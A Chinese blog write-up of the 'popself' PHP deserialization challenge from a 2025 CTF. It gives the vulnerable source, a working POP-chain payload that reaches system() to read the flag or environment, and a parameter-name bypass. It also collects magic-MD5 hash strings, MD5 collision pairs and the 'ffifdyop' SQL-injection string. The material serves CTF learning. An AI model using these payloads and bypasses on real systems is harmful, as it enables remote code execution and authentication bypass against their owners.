---
title:  2025极客大挑战 popself wp
published: 2025-11-24
pinned: false
description: 通过2025极客大挑战回顾或学习了一些php反序列化的知识点.
tags: [CTF, php, game]
category: CTF
draft: false
---

# 极客大挑战 popself wp

## 源码：

```php
<?php
show_source(__FILE__);

error_reporting(0);
class All_in_one
{
    public $KiraKiraAyu;
    public $_4ak5ra;
    public $K4per;
    public $Samsāra;
    public $komiko;
    public $Fox;
    public $Eureka;
    public $QYQS;
    public $sleep3r;
    public $ivory;
    public $L;

    public function __set($name, $value){
        echo "他还是没有忘记那个".$value."<br>";
        echo "收集夏日的碎片吧<br>";

        $fox = $this->Fox;//

        if ( !($fox instanceof All_in_one) && $fox()==="summer"){
            echo "QYQS enjoy summer<br>";
            echo "开启循环吧<br>";
            $komiko = $this->komiko;
            $komiko->Eureka($this->L, $this->sleep3r);
        }
    }

    public function __invoke(){
        echo "恭喜成功signin!<br>";
        echo "welcome to Geek_Challenge2025!<br>";
        $f = $this->Samsāra;
        $arg = $this->ivory;
        $f($arg);
    }
    public function __destruct(){

        echo "你能让K4per和KiraKiraAyu组成一队吗<br>";

        if (is_string($this->KiraKiraAyu) && is_string($this->K4per)) {
            if (md5(md5($this->KiraKiraAyu))===md5($this->K4per)){
                die("boys和而不同<br>");
            }

            if(md5(md5($this->KiraKiraAyu))==md5($this->K4per)){
                echo "BOY♂ sign GEEK<br>";
                echo "开启循环吧<br>";
                $this->QYQS->partner = "summer"; //将$obj1的QYQS属性对应$obj2，给它的partner属性赋值"summer"因为不存在这个属性，所以触发_set
            }
            else {
                echo "BOY♂ can`t sign GEEK<br>";
                echo md5(md5($this->KiraKiraAyu))."<br>";
                echo md5($this->K4per)."<br>";
            }
        }
        else{
            die("boys堂堂正正");
        }
    }

    public function __tostring(){
        echo "再走一步...<br>";
        $a = $this->_4ak5ra; 
        $a();
    }

    public function __call($method, $args){        
        if (strlen($args[0])<4 && ($args[0]+1)>10000){
            echo "再走一步<br>";
            echo $args[1];
        }
        else{
            echo "你要努力进窄门<br>";
        }
    }
}

class summer {
    public static function find_myself(){
        return "summer";
    }
}
$payload = $_GET["24_SYC.zip"];

if (isset($payload)) {
    unserialize($payload);
} else {
    echo "没有大家的压缩包的话，瓦达西！<br>";
}

?> 
```

这是一道php反序列化的题目，考点很多，所以写个wp

看题目构造php反序列化链

```php
obj1 (起点)
  ├── KiraKiraAyu: "aawBzC"
  ├── K4per: "s1885207154a" 
  └── QYQS: obj2
        ├── Fox: ["summer", "find_myself"]
        ├── komiko: obj3 //多少都可以，因为不存在方法 
        ├── L: "1e9"
        └── sleep3r: obj3
              └── _4ak5ra: obj4
                    ├── Samsāra: "system"
                    └── ivory: "cat /flag"
```

> __destruct() → __set() → __call() → __toString() → __invoke() → system()

### payload:

```php
<?php

class All_in_one
{
    public $KiraKiraAyu;
    public $_4ak5ra;
    public $K4per;
    public $Samsāra;
    public $komiko;
    public $Fox;
    public $Eureka;
    public $QYQS;
    public $sleep3r;
    public $ivory;
    public $L;
}

class summer {
    public static function find_myself(){
        return "summer";
    }
}

// 创建对象 obj4，用于执行 system("cat /flag")
$obj4 = new All_in_one();
$obj4->Samsāra = "system";
$obj4->ivory = "env";

// 创建对象 obj3，用于触发 __toString 和 __invoke
$obj3 = new All_in_one();
$obj3->_4ak5ra = $obj4;

// 创建对象 obj2，用于触发 __set 和 __call
$obj2 = new All_in_one();
$obj2->Fox = array("summer", "find_myself"); // 可调用，返回 "summer"
$obj2->komiko = $obj3; //触发 __call,因为不存在Eureka方法
$obj2->L = "1e9"; // 满足 __call 条件：长度小于4且值加1大于10000
$obj2->sleep3r = $obj3;

// 创建对象 obj1，起点
$obj1 = new All_in_one();
$obj1->KiraKiraAyu = "aawBzC"; // 使 md5(md5($KiraKiraAyu)) 以 "0e" 开头
$obj1->K4per = "s1885207154a"; // 使 md5($K4per) 以 "0e" 开头
$obj1->QYQS = $obj2;

// 输出 URL 编码后的序列化字符串
echo urlencode(serialize($obj1));

?>
```



## 不合法参数名

`$payload = $_GET["24_SYC.zip"]`注意到，`24_SYC.zip`这个参数名称中的`.`是非法的

> 这里就有条件可以利用一个PHP8被修复的转换错误进行传参：https://github.com/php/php-src/commit//fc4d462e947828fdbeac6020ac8f34704a218834?branch=fc4d462e947828fdbeac6020ac8f34704a218834&diff=unified
> 当PHP版本小于8时，如果参数中出现中括号[，中括号会被转换成下划线_，但是会出现转换错误导致接下来如果该参数名中还有非法字符并不会继续转换成下划线_，也就是说如果中括号[出现在前面，那么中括号[还是会被转换成下划线_，但是因为出错导致接下来的非法字符并不会被转换成下划线_
> ————————————————
> 版权声明：本文为CSDN博主「末 初」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
> 原文链接：https://blog.csdn.net/mochu7777777/article/details/115050295

所以需要把参数名改为

```php
?24[STC.zip=
```

这样才能合法传参

## php中的调用静态方法的特殊语法

```php
if ( !($fox instanceof All_in_one) && $fox()==="summer")
```

这里涉及到一个知识点，要求`$fox`不属于`All_in_one`类,但是`$fox`强等于summer

payload：

```php
$obj2->Fox = array("summer", "find_myself");
```

这里我们将Fox定义为一个数组，所以不属于`All_in_one`类,但是这种数组表达方式是php中特殊语法：**可调用数组(Callable Array)**特性

`["类名", "静态方法名"]()` = 调用该类的静态方法

```php
array("summer", "find_myself")() 
= summer::find_myself() 
= "summer" ✓ **成功变出 summer！**
```

```php
// 以下三种写法等价：
$method1 = array("summer", "find_myself");
$result1 = $method1();  // 调用静态方法

$method2 = "summer::find_myself";  
$result2 = $method2();  // 调用静态方法

$method3 = function() { return summer::find_myself(); };
$result3 = $method3();  // 调用匿名函数

//对应的定义类(payload中增添的类)
class summer {
    public static function find_myself(){
        return "summer";  // 这个方法固定返回 "summer"
    }
}
```

## php反序列化魔术方法

写这一题的时候下意识的认为反序列化链都是按顺序排的，可见对反序列化链的挖掘以及反序列化魔术方法还是不够熟练，所以这里再终结一下php反序列化魔术方法

| 魔术方法        | 触发时机                                       |
| --------------- | ---------------------------------------------- |
| __construct()   | 在实例化对象时触发                             |
| __destruct()    | 在对象被销毁时触发                             |
| __sleep()       | 在进行序列化时触发                             |
| __wakeup()      | 在进行反序列化时触发                           |
| __serialize()   | 在进行序列化时触发                             |
| __unserialize() | 在进行反序列化时触发                           |
| __toString()    | 被当成字符串调用时                             |
| __invoke()      | 被当成函数调用时                               |
| __set()         | 给不可访问或者不存在的属性赋值时               |
| __get()         | 调用不可访问或者不存在的属性的值时             |
| __isset()       | 对不可访问或不存在的属性调用isset()或empty()时 |
| __unset()       | 对不可访问或不存在的属性调用unset()时          |
| __call()        | 调用不可访问的方法时                           |
| __callStatic()  | 在静态上下文中调用一个不可访问的方法时         |

### __construct()

每次实例化一个对象时都会先调用此方法

php

```php
<?php
class star{
    public function __construct(){
        echo 'gogogo触发喽';
    }
}

$star = new star();//gogogo触发喽
```

### __destruct()

某个对象的所有引用都被删除或当对象被显式销毁时执行

php

```php
<?php
class Moon{
    function __construct(){
        echo "流萤逐月\n";
    }

    function __destruct(){
        echo "月落乌啼霜满天\n";
    }
}

$moon = new Moon();
//流萤逐月
//月落乌啼霜满天
```

### __sleep()

serialize()函数会检查类中是否存在一个魔术方法__sleep()。如果存在，该方法会先被调用，然后才执行序列化操作

php

```php
<?php
error_reporting(0);
class Moon{
    public $moon='月亮 ';

    function __construct(){
        echo $this->moon;
    }
    function __sleep(){
        $this -> moon = 'moon';
        echo $this -> moon;
    }
}

$moon = new Moon();//月亮

serialize($moon);//moon
```

### __wakeup()

unserialize()函数会检查类中是否存在一个魔术方法__wakeup()。如果存在，该方法会先被调用，然后才执行序列化操作

php

```php
<?php
error_reporting(0);
class Moon{
    
    public $moon='月亮';

    function __construct(){
        echo $this->moon;
    }

    function __wakeup(){
        $this -> moon = 'moon';
        echo $this -> moon;
    }
}

$moon = new Moon();//月亮

$tem=serialize($moon);

unserialize($tem);//moon
```

### __serialize()

serialize()函数会检查类中是否存在一个魔术方法`__serialize()`。如果存在，该方法将在任何序列化之前优先执行,然后才执行序列化操作,它必须以一个代表对象序列化形式的 键/值 成对的关联数组形式来返回，如果没有返回数组，将会抛出一个`TypeError`错误。 如果类中同时定义了`__sleep()`和`__serialize()`，则只有`__serialize()`会被调用，`__sleep()`方法会被忽略掉

php

```php
<?php
error_reporting(0);
class Moon{
    public $moon='月亮 ';

    function __construct(){
        echo $this->moon;
    }
    
    function __sleep(){
        $this -> moon = 'moon';
        echo $this -> moon;
    }

    function __serialize(){
        $this -> moon = 'star';
        echo $this -> moon;
    }
}

$moon = new Moon();//月亮

serialize($moon);//star
```

### __unserialize()

unserialize()函数会检查类中是否存在一个魔术方法`__unserialize()`。如果存在，该方法会先被调用，然后才执行序列化操作，此函数将会传递从`__serialize()`返回的恢复数组。然后它可以根据需要从该数组中恢复对象的属性。如果类中同时定义了`__wakeup()`和`__serialize()`，则只有`__serialize()`会被调用，`__wakeup()`方法会被忽略掉

php

```php
<?php
error_reporting(0);
class Moon{

    public $moon='月亮';

    function __construct(){
        echo $this->moon;
    }

    function __wakeup(){
        $this -> moon = 'moon';
        echo $this -> moon;
    }

    function __unserialize(array $data):void{
        $this -> moon = "star";
        echo $this -> moon;
}
}

$moon = new Moon();//月亮

$tem=serialize($moon);

unserialize($tem);//star
```

php

```php
<?php
error_reporting(0);
class Moon{
    public $moon;
    public $star;
    public $sun;

    function __serialize():array{
        return [
            'moon'=>$this->moon,
            'star'=>$this->star,
            'sun'=>$this->sun
        ];
    }
    function __unserialize(array $data):void{
        $this->moon = $data['moon'];
        $this->star = $data['star'];
        $this->sun = $data['sun'];
    }
}
```

### __toString()

__toString()方法用于一个类被当成字符串时应怎样回应

php

```php
<?php
error_reporting(0);
class Moon{

    function __toString(){
        echo "桂魄初生";
}
}

$moon = new Moon();
echo $moon;//桂魄初生
```

### __invoke()

当尝试以调用函数的方式调用一个对象时，__invoke()方法会被自动调用

php

```php
<?php
error_reporting(0);
class Moon{

    function __invoke(){
        echo "清辉漫瓦";
}
}

$moon = new Moon();
$moon();//清辉漫瓦
```

### __set()

在给不可访问（protected 或 private）或不存在的属性赋值时，__set()会被调用

php

```php
<?php
error_reporting(0);
class Moon{
    function __set($name,$value){
        echo "玉壶冰心";
    }
}

$moon = new Moon();
$moon-> null = 'null';//玉壶冰心
```

### __get()

读取不可访问（protected 或 private）或不存在的属性的值时，__get()会被调用

php

```php
<?php
error_reporting(0);
class Moon{
    function __get($star){
        echo "蟾光碎银";
    }
}

$moon = new Moon();
$moon-> null;//蟾光碎银
```

### __isset()

当对不可访问（protected 或 private）或不存在的属性调用 isset()或empty()时,__isset()会被调用

php

```php
<?php
error_reporting(0);
class Moon{
    function __isset($star){
        echo "素娥垂泪";
    }
}

$moon = new Moon();
isset($moon -> null);//素娥垂泪
```

### __unset()

php

```php
<?php
error_reporting(0);
class Moon{
    function __unset($star){
        echo "寒璧悬空";
    }
}

$moon = new Moon();
unset($moon -> null);//寒璧悬空
```

### __call()

对象中调用一个不可访问方法时,__call()会被调用

php

```php
<?php
error_reporting(0);
class Moon{
    function __call($name, $arguments){
        echo "河汉清浅";
    }
}

$moon = new Moon();
$moon -> invalid();//河汉清浅
```

### __callStatic()

在静态上下文中调用一个不可访问方法时，__callStatic()会被调用

php

```php
<?php
error_reporting(0);
class Moon{
    static function __callStatic($name, $arguments){
        echo "银潢倾泻";
    }
}

$moon = new Moon();
Moon::invalid();//银潢倾泻
```

## md5碰撞

md5类型的题目一般会遇到`弱比较`和`强比较`以及`md5注入`

### 弱比较

科学计数法

字符串会进行下列步骤：

1. 如果字符串开头是字母，直接等于0
2. 如果不为字母，则截止到遇到的第一个字母。例如132a会被保留为123

但是对于e来说，它在php内可以用作科学计数法。

#### `md5(a)=md5(b)`

```php
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s1885207154a
0e509367213418206700842008763514
s1502113478a
0e861580163291561247404381396064
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s155964671a
0e342768416822451524974117254469
s1184209335a
0e072485820392773389523109082030
s1665632922a
0e731198061491163073197128363787
s1502113478a
0e861580163291561247404381396064
s1836677006a
0e481036490867661113260034900752
s1091221200a
0e940624217856561557816327384675
s155964671a
0e342768416822451524974117254469
s1502113478a
0e861580163291561247404381396064
s155964671a
0e342768416822451524974117254469
s1665632922a
0e731198061491163073197128363787
s155964671a
0e342768416822451524974117254469
s1091221200a
0e940624217856561557816327384675
s1836677006a
0e481036490867661113260034900752
s1885207154a
0e509367213418206700842008763514
s532378020a
0e220463095855511507588041205815
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s214587387a
0e848240448830537924465865611904
s1502113478a
0e861580163291561247404381396064
s1091221200a
0e940624217856561557816327384675
s1665632922a
0e731198061491163073197128363787
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s1665632922a
0e731198061491163073197128363787
s878926199a
0e545993274517709034328855841020
240610708:0e462097431906509019562988736854
QLTHNDT:0e405967825401955372549139051580
QNKCDZO:0e830400451993494058024219903391
PJNPDWY:0e291529052894702774557631701704
NWWKITQ:0e763082070976038347657360817689
NOOPCJF:0e818888003657176127862245791911
MMHUWUV:0e701732711630150438129209816536
MAUXXQC:0e478478466848439040434801845361
```

#### `$a==md5($a)`

```php
0e215962017 0e291242476940776845150308577824

0e1284838308 0e708279691820928818722257405159

0e1137126905 0e291659922323405260514745084877

0e807097110 0e318093639164485566453180786895

0e730083352 0e870635875304277170259950255928

```

#### `md5(md5($a))=oe···`

```php
aawBzC
aabsbm9
aaaabGG5T
aaaabKGVH
```

### 强比较

数组绕过，原理是当进行md5计算的时候，无法求出数组array的值，于是会返回`null`

两个数组就会`===`

#### md5碰撞

当强制要求为字符串是就无法通过数组绕过了，从errr师傅那里获取了两个字符串，可以通过md5碰撞达到强等于

```php
pwp%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%91%E6%F0aZ%7CF%BFk%D0%E0%B4%9B%2A%1B%60%81%C7OH%ACWBt%2A%EAw%8D%F21%0F%EE%E7%A3%EE%EDZ.%E9%B0%EB-%BE9%9E%A3%A6X%DF%E9%EA%8F%16%87e%3CX%B0%D38%CFN%16v%81%0F%C9%12%98%92%5B%A1sO0XJ%9C%E5c%BD%21%1F_t%D6%F2%FF%0D%B3%00%C7%2B%60H%C7%CB%8D%0C%28%97E%FF%7D%F6%3C%C2%9A%1C%40%1B%C7%B6%0D%88%B3UD%D7%82EM5%C4%19w%CCP

pwp%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%91%E6%F0aZ%7CF%BFk%D0%E0%B4%9B%2A%1B%60%81%C7O%C8%ACWBt%2A%EAw%8D%F21%0F%EE%E7%A3%EE%EDZ.%E9%B0%EB-%BE9%9E%23%A7X%DF%E9%EA%8F%16%87e%3CX%B0%D3%B8%CFN%16v%81%0F%C9%12%98%92%5B%A1sO0XJ%9C%E5c%BD%21%1F%DFt%D6%F2%FF%0D%B3%00%C7%2B%60H%C7%CB%8D%0C%28%97E%FF%7D%F6%3C%C2%9A%1C%C0%1A%C7%B6%0D%88%B3UD%D7%82EM5D%19w%CCP

```

还有

```php
$a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2

$b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2

```

###  数据库

只需记住`ffifdyop`

这个字符串md5编码后是`'or'6�]��!r,��b`

当进行md5注入时便会得到

```php
$query = "SELECT * FROM flag WHERE password = ''or'6�]��!r,��b
```

返回总为ture

